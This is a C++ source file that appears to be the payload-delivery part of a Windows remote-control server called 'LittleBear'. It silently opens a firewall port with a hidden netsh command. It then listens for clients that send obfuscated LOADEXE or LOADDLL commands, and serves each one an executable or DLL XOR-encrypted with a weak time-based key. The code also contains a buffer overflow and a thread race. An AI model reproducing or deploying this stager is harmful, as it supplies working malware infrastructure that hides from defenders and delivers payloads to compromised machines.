#include <windows.h>
#include <winsock.h>
#include "DownloadProgram.h"
#include "LittleBearMainServer.h"
#include "Public.h"
#pragma comment(lib,"ws2_32.lib")

#define CRYPT_KEY_SIZE 16



int __stdcall WriteLogFile(char * pLog)
{
	HANDLE hFile = CreateFileA(LOGFILENAME,GENERIC_WRITE,0,0,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	int iRet = SetFilePointer(hFile,0,0,FILE_END);

	char szTime[MAX_PATH];
	SYSTEMTIME stTime = {0};
	GetLocalTime(&stTime);
	wsprintfA(szTime,"%u-%u-%u %d:%d:%d ",stTime.wYear,stTime.wMonth,stTime.wDay,stTime.wHour,stTime.wMinute,stTime.wSecond);
	DWORD dwCnt = 0;
	char szMsg[1024];
	int iLen = wsprintfA(szMsg,"%s %s",szTime,pLog);

	iRet = WriteFile(hFile,szMsg,iLen,&dwCnt,0);
	if (iRet == FALSE  || dwCnt != iLen)
	{
		CloseHandle(hFile);
		return FALSE;
	}

	CloseHandle(hFile);
	return TRUE;
}



DWORD GetStringFromAddr(STCLIENTSOCKINFO stParam,char * pBuf)
{
	unsigned char * pIP = (unsigned char*)&stParam.saClient.sin_addr.S_un.S_addr;
	int iLen = wsprintfA(pBuf,"ip:%u.%u.%u.%u port:%u socket:%u",pIP[0],pIP[1],pIP[2],pIP[3],ntohs(stParam.saClient.sin_port),stParam.sClient);
	return iLen;
}


DWORD GetCryptKey(char * pKey)
{
	SYSTEMTIME stSystime = {0};
	GetSystemTime(&stSystime);

	DWORD dwTickCnt[CRYPT_KEY_SIZE/sizeof(DWORD)] = {0};
	for (int i= 0; i < CRYPT_KEY_SIZE/sizeof(DWORD); i ++)
	{
		dwTickCnt[i] = GetTickCount();
	}

	char * pSystemTime = (char*)&stSystime;
	char * pTickCnt = (char*)dwTickCnt;
	for (int j = 0 ; j < CRYPT_KEY_SIZE; j ++)
	{
		pKey[j] = pSystemTime[j] ^ pTickCnt[j];
	}
	return TRUE;
}





DWORD __stdcall SendProgramToClient(LPSTCLIENTSOCKINFO pClientInfo)
{
	STCLIENTSOCKINFO stClientInfo = * pClientInfo;
	char pBuf[4096];
	int iRecvLen = recv(stClientInfo.sClient,pBuf,4096,0);
	if (iRecvLen <= 0)
	{
		closesocket(stClientInfo.sClient);
		WriteLogFile("SendProgramToClient recv first packet error\r\n");
		return FALSE;
	}

	*(pBuf + iRecvLen) = 0;

	char szLoadExeCmd[] = {'L','O','A','D','E','X','E',0};
	char szLoadDllCmd[] = {'L','O','A','D','D','L','L',0};
	if (lstrcmpA(pBuf,szLoadExeCmd) == 0)
	{
		char szFindPath[MAX_PATH];
		GetCurrentDirectoryA(MAX_PATH,szFindPath);
		lstrcatA(szFindPath,"\\");
		lstrcatA(szFindPath,DOWNLOADPROGRAM_PATH);
		lstrcatA(szFindPath,"\\");

		char szAllExe[MAX_PATH];
		lstrcpyA(szAllExe,szFindPath);
		lstrcatA(szAllExe,"*.exe");
		WIN32_FIND_DATAA stFd = {0};
		HANDLE hFind = FindFirstFileA(szAllExe,(LPWIN32_FIND_DATAA)&stFd);
		if (hFind == INVALID_HANDLE_VALUE)
		{
			closesocket(stClientInfo.sClient);
			WriteLogFile("SendProgramToClient FindFirstFileA exe error\r\n");
			return FALSE;
		}

		if (strstr(stFd.cFileName,".exe"))
		{
			lstrcatA(szFindPath,stFd.cFileName);
			HANDLE hFExe = CreateFileA(szFindPath,GENERIC_READ | GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
			if (hFExe == INVALID_HANDLE_VALUE)
			{
				closesocket(stClientInfo.sClient);
				WriteLogFile("SendProgramToClient create exe file error\r\n");
				return FALSE;
			}

			int iCmdHdrSize = sizeof(int) + sizeof(int) + sizeof(int) + lstrlenA(stFd.cFileName);
			
			DWORD dwFileSize = GetFileSize(hFExe,0);
			DWORD dwSendSize = iCmdHdrSize+ dwFileSize + CRYPT_KEY_SIZE ;
			char * pFileBuf = new char [dwSendSize];
			*(int*)pFileBuf = iCmdHdrSize+ dwFileSize + CRYPT_KEY_SIZE;
			*(int*)(pFileBuf + sizeof(int)) = 1;
			*(int*)(pFileBuf + sizeof(int) + sizeof(int)) = lstrlenA(stFd.cFileName);
			lstrcpyA(pFileBuf + sizeof(int) + sizeof(int) + sizeof(int),stFd.cFileName);

			DWORD dwCnt = 0;
			int iRet = ReadFile(hFExe,pFileBuf + iCmdHdrSize ,dwFileSize,&dwCnt,0);
			CloseHandle(hFExe);
			if (iRet == FALSE || dwCnt != dwFileSize)
			{
				delete [] pFileBuf;
				closesocket(stClientInfo.sClient);
				WriteLogFile("read exe file error\r\n");
				return FALSE;
			}

			char * pKey = pFileBuf + iCmdHdrSize + dwFileSize ;
			GetCryptKey(pKey);
			char * pFileContentBuf = pFileBuf + iCmdHdrSize;
			for(DWORD i = 0,j = 0; i < dwFileSize; )
			{
				pFileContentBuf[i] ^= pKey[j];
				j ++;
				if (j == CRYPT_KEY_SIZE)
				{
					j = 0; 
				}
				i ++;
			}


			iRet = send(stClientInfo.sClient,pFileBuf,dwSendSize,0);
			delete [] pFileBuf;
			closesocket(stClientInfo.sClient);

			char szClientInfo[MAX_PATH];
			GetStringFromAddr(stClientInfo,szClientInfo);
			char szShowInfo[1024];
			wsprintfA(szShowInfo,"send exe file ok %s\r\n",szClientInfo);
			return TRUE;
		}else{
			closesocket(stClientInfo.sClient);
			WriteLogFile("FindNextFileA not found exe file\r\n");
			return FALSE;
		}
	}
	else if (lstrcmpA(pBuf,szLoadDllCmd) == 0)
	{
		char szFindPath[MAX_PATH];
		GetCurrentDirectoryA(MAX_PATH,szFindPath);
		lstrcatA(szFindPath,"\\");
		lstrcatA(szFindPath,DOWNLOADPROGRAM_PATH);
		lstrcatA(szFindPath,"\\");

		char szAllExe[MAX_PATH];
		lstrcpyA(szAllExe,szFindPath);
		lstrcatA(szAllExe,"*.dll");
		WIN32_FIND_DATAA stFd = {0};
		HANDLE hFind = FindFirstFileA(szAllExe,(LPWIN32_FIND_DATAA)&stFd);
		if (hFind == INVALID_HANDLE_VALUE)
		{
			closesocket(stClientInfo.sClient);
			WriteLogFile("SendProgramToClient FindFirstFileA dll error\r\n");
			return FALSE;
		}

		if (strstr(stFd.cFileName,".dll"))
		{
			lstrcatA(szFindPath,stFd.cFileName);
			HANDLE hFExe = CreateFileA(szFindPath,GENERIC_READ | GENERIC_WRITE,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
			if (hFExe == INVALID_HANDLE_VALUE)
			{
				closesocket(stClientInfo.sClient);
				WriteLogFile("SendProgramToClient create dll file error\r\n");
				return FALSE;
			}

			int iCmdHdrSize = sizeof(int) + sizeof(int) + sizeof(int) + lstrlenA(stFd.cFileName);

			DWORD dwFileSize = GetFileSize(hFExe,0);
			DWORD dwSendSize = iCmdHdrSize+ dwFileSize + CRYPT_KEY_SIZE ;
			char * pFileBuf = new char [dwSendSize];
			*(int*)pFileBuf = iCmdHdrSize+ dwFileSize + CRYPT_KEY_SIZE;
			*(int*)(pFileBuf + sizeof(int)) = 1;
			*(int*)(pFileBuf + sizeof(int) + sizeof(int)) = lstrlenA(stFd.cFileName);
			lstrcpyA(pFileBuf + sizeof(int) + sizeof(int) + sizeof(int),stFd.cFileName);

			DWORD dwCnt = 0;
			int iRet = ReadFile(hFExe,pFileBuf + iCmdHdrSize ,dwFileSize,&dwCnt,0);
			CloseHandle(hFExe);
			if (iRet == FALSE || dwCnt != dwFileSize)
			{
				delete [] pFileBuf;
				closesocket(stClientInfo.sClient);
				WriteLogFile("read dll file error\r\n");
				return FALSE;
			}

			char * pKey = pFileBuf + iCmdHdrSize + dwFileSize ;
			GetCryptKey(pKey);
			char * pFileContentBuf = pFileBuf + iCmdHdrSize;
			for(DWORD i = 0,j = 0; i < dwFileSize;)
			{
				pFileContentBuf[i] ^= pKey[j];
				j ++;
				if (j == CRYPT_KEY_SIZE)
				{
					j = 0; 
				}
				i ++;
			}


			iRet = send(stClientInfo.sClient,pFileBuf,dwSendSize,0);
			delete [] pFileBuf;
			closesocket(stClientInfo.sClient);

			char szClientInfo[MAX_PATH];
			GetStringFromAddr(stClientInfo,szClientInfo);
			char szShowInfo[1024];
			wsprintfA(szShowInfo,"send dll file ok %s\r\n",szClientInfo);
			return TRUE;
		}else{
			closesocket(stClientInfo.sClient);
			WriteLogFile("FindNextFileA not found dll file\r\n");
			return FALSE;
		}
	}
	else
	{
		closesocket(stClientInfo.sClient);
		WriteLogFile("unkown command\r\n");
		return FALSE;
	}

	return FALSE;
}




DWORD __stdcall DownloadProgram()
{
	char szFireWallPortOpenCmd[MAX_PATH];
	wsprintfA(szFireWallPortOpenCmd,"cmd /c netsh firewall set portopening TCP %u ENABLE >> cmdresult.txt",DOWNLOADPROGRAM_PORT);
	int iRet = WinExec(szFireWallPortOpenCmd,SW_HIDE);

	SOCKET sListen = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (sListen == INVALID_SOCKET)
	{
		return FALSE;
	}

	sockaddr_in stServerAddr = {0};
	stServerAddr.sin_family = AF_INET;
	stServerAddr.sin_port = ntohs(DOWNLOADPROGRAM_PORT);
	stServerAddr.sin_addr.S_un.S_addr = dwIP;			

	iRet = bind(sListen,(sockaddr*)&stServerAddr,sizeof(sockaddr_in));
	if (iRet == INVALID_SOCKET)
	{
		iRet = WSAGetLastError();
		closesocket(sListen);
		return FALSE;
	}

	iRet = listen(sListen,MAX_SERVER_LISTEN_COUNT);
	if (iRet == INVALID_SOCKET)
	{
		closesocket(sListen);
		return FALSE;
	}

	STCLIENTSOCKINFO stClientInfo = {0};
	while (TRUE)
	{
		sockaddr_in stClientAddr = {0};
		int iClientAddrLen = sizeof(sockaddr_in);

		SOCKET sClient = accept(sListen,(sockaddr*)&stClientAddr,&iClientAddrLen);
		if (sClient != INVALID_SOCKET)
		{
			stClientInfo.saClient = stClientAddr;
			stClientInfo.sClient = sClient;
			HANDLE hClientProc = CreateThread(0,0,(LPTHREAD_START_ROUTINE)SendProgramToClient,&stClientInfo,0,0);
			CloseHandle(hClientProc);
		}
		else
		{
			int iRet = WSAGetLastError();
			LPVOID lpMsgBuf = 0;
			int iReturn = FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |FORMAT_MESSAGE_FROM_SYSTEM, NULL,iRet,MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),(LPTSTR) &lpMsgBuf, 0, NULL );
			if (iReturn)
			{
				char szClientInfo[MAX_PATH];
				GetStringFromAddr(stClientInfo,szClientInfo);
				char szShowInfo[1024];
				wsprintfA(szShowInfo,"listen accept error,error code:%u,error description:%s client:%s\r\n",iRet,lpMsgBuf,szClientInfo);
				WriteLogFile(szShowInfo);
				LocalFree(lpMsgBuf);
			}
		}
	}

	return TRUE;
}





